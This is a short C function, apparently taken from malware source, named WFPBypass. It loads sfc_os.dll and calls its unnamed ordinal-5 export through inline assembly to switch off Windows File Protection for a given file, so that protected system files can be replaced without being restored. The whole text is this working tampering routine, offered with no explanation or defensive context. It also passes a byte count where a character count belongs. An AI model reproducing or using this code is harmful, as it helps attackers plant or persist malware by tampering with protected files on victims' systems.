void WFPBypass(char *lpFileName)
{
	wchar_t lpFileNameW[MAX_PATH];
	PVOID fname = &lpFileNameW;

	MultiByteToWideChar(CP_ACP, 0, lpFileName, -1, lpFileNameW, sizeof(lpFileNameW));
	
	HMODULE hLib = LoadLibrary("sfc_os.dll");

	if (hLib == 0)
		return;

	PVOID func = GetProcAddress(hLib, MAKEINTRESOURCE(5)); 

	if (func == 0)
	return;

	__asm 
	{
		push 	-1
		push 	fname
		push 	0
		call 	func
	}
}